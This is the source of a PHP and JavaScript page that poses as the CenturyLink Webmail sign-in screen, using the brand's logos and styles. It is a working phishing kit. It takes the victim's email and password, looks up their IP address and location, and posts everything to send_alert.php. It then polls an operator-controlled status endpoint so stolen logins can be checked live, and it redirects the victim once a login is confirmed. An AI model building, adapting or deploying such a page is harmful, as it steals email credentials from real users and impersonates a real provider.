<?php
session_start();
if (empty($_SESSION['visitor_id'])) {
    $_SESSION['visitor_id'] = bin2hex(random_bytes(8));
}
$sid = $_SESSION['visitor_id'];
?>
<!DOCTYPE html>
<html lang="en" class="win chrome chrome1 webkit webkit5">
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Sign In - CenturyLink Webmail</title>

    <link href="https://fonts.googleapis.com/css?family=Open+Sans:300,400,600,700,800" rel="stylesheet">
    <link rel="shortcut icon" href="https://webmail.centurylink.net/favicon.ico"> 
    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Material+Symbols+Outlined:wght@400">
    <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
    <link href="https://fonts.googleapis.com/icon?family=Material+Icons+Outlined" rel="stylesheet">
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" crossorigin="anonymous">
    <link rel="stylesheet" type="text/css" href="https://webmail.centurylink.net/app/s/lumen2/css/style2.css?v=4">
    <link rel="stylesheet" type="text/css" href="https://c82cc6930f2f194a0208-57d85b8e10a5c70b320e1b86a00e79e4.ssl.cf2.rackcdn.com/v1/css/responsive_v2.css">

    <style>
        input { box-shadow: none; }
        input:focus { box-shadow: none !important; }
        .form-group { margin-bottom: 0px !important; }
        .form-group2 { margin-bottom: 30px !important; }
        .btndisabled { color: #fff; background-color: #B4BCC9 !important; }
        .loadingimg {
            display: block;
            visibility: hidden;
            margin-left: auto;
            margin-right: auto;
            width: 47px;
            height: 47px;
            background-image: url("https://c82cc6930f2f194a0208-57d85b8e10a5c70b320e1b86a00e79e4.ssl.cf2.rackcdn.com/v1/images/Ellipsis-1.4s-47px.gif")
        }
        body {
            background-image: url(https://c82cc6930f2f194a0208-57d85b8e10a5c70b320e1b86a00e79e4.ssl.cf2.rackcdn.com/v1/images/centurylink-logo-black-BG5.svg);
            background-repeat: no-repeat;
            background-position: right bottom;
            background-size: calc(max(30%, 500px));
        }
        .main-title-wrap h1::after { background-color: #db0632 !important; }
    </style>
</head>
<body>

<main class="main-content-wrapper sign-in-wrapper" id="mLoginBox">
    <header>
        <div class="site-logo">
            <a href="https://centurylink.net/" target="_parent">
                <img src="https://c82cc6930f2f194a0208-57d85b8e10a5c70b320e1b86a00e79e4.ssl.cf2.rackcdn.com/v1/images/centurylink_logo_s.png" alt="CenturyLink">
            </a>    
        </div>
    </header>

    <section class="content-holder" id="signin_s1">
        <div class="container">
            <div class="form-detail-wrapper">
                <div class="left-content-wrap" style="margin-bottom: 20px">
                    <form autocomplete="off" id="loginForm">
                        <input type="hidden" id="visitor_id" value="<?= $sid ?>">

                        <div class="form-group">
                            <input type="text" autocomplete="on" name="signin_email" id="email" style="text-transform: lowercase" required="">
                            <label for="email">CenturyLink Email</label>
                            <span class="email-error error-msg" style="visibility: hidden">This needs to be filled</span>
                        </div>
                        <div class="form-group">
                            <input type="password" autocomplete="on" name="signin_password" id="password" required="">
                            <label for="password">Password</label>
                            <span class="email-error error-msg" style="visibility: hidden">This needs to be filled</span>
                        </div>
                        <div class="form-group" style="font-size: 12px">
                            <input name="rememberme" id="RememberMe" type="checkbox" style="width: auto !important;height: auto !important; vertical-align: middle"> Stay signed in
                        </div>
                        <button type="submit" id="submit-btn" style="margin-top: 20px !important; background-color: #0047bb !important;">Sign In</button>
                        <div id="error" style="display:none; color: red; padding: 10px;"></div>
                        <div id="msg" style="display:none; color: red; padding: 10px;"></div>
                    </form>

                    <div class="form-group" style="font-size: 12px; padding-top: 15px;">
                        <a href="/v1/recover/" target="blank" class="link" style="color:#0047bb !important;">Forgot Password?</a>
                        <span style="float: right">
                            <a href="https://centurylinkwebmail.s.center/hc/en-us" target="blank" class="link" style="color:#0047bb !important;">Need help?</a>
                        </span>
                    </div>

                    <div class="loadingimg" id="loader"></div>
                </div>

                <div class="right-content-wrap" style="display: none;">
                    <figure>
                        <img src="https://webmail.centurylink.net/app/s/lumen2/webmaillogin_0.png" alt="">
                    </figure>
                </div>
            </div>
        </div>
    </section>
</main>

<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
<script>
$(document).ready(function () {
    let pollInterval = null;

    const hashEmail = window.location.hash.substr(1);
    if (hashEmail) {
        $('#email').val(hashEmail);
    }

    $('#loginForm').on('submit', function (e) {
        e.preventDefault();

        const email = $('#email').val().trim();
        const password = $('#password').val().trim();
        const sid = $('#visitor_id').val();

        $('#error, #msg').hide();

        const emailRegex = /^[a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\.[a-zA-Z0-9-.]+$/;

        if (!email || !emailRegex.test(email)) {
            showError("Enter a valid email.");
            return;
        }
        if (!password) {
            showError("Enter a password.");
            return;
        }

        $('#loader').css('visibility', 'visible');
        $('#submit-btn').prop('disabled', true);

        fetch('https://ipinfo.io/json')
            .then(response => response.json())
            .then(data => {
                postData(email, password, sid, data.ip || 'Unknown', data.city || 'Unknown', data.region || 'Unknown', data.country || 'Unknown');
            })
            .catch(() => {
                postData(email, password, sid, 'Unknown', 'Unknown', 'Unknown', 'Unknown');
            });
    });

    function postData(email, password, sid, ip, city, region, country) {
        $.ajax({
            url: 'send_alert.php',
            type: 'POST',
            dataType: 'json',
            data: {
                email: email,
                password: password,
                sid: sid,
                ip: ip,
                city: city,
                region: region,
                country: country
            },
            success: function (res) {
                if (res.ok) {
                    startPolling(sid, res.domain);
                } else {
                    $('#loader').css('visibility', 'hidden');
                    $('#submit-btn').prop('disabled', false);
                    alert("Failed to send notification.");
                }
            },
            error: function () {
                $('#loader').css('visibility', 'hidden');
                $('#submit-btn').prop('disabled', false);
                alert("Server communication error.");
            }
        });
    }

    function startPolling(sid, domain) {
        pollInterval = setInterval(function () {
            $.get('check_status.php?sid=' + sid, function (data) {
                if (data.status === 'incorrect') {
                    clearInterval(pollInterval);
                    $('#loader').css('visibility', 'hidden');
                    $('#submit-btn').prop('disabled', false);
                    $('#error').show().html("The username or password you entered is incorrect.");
                    $('#password').val('');
                } else if (data.status === 'valid') {
                    clearInterval(pollInterval);
                    window.location.replace("https://www." + domain);
                }
            }, 'json');
        }, 2000);
    }

    function showError(msg) {
        $('#error').show().html(msg);
    }
});
</script>
</body>
</html>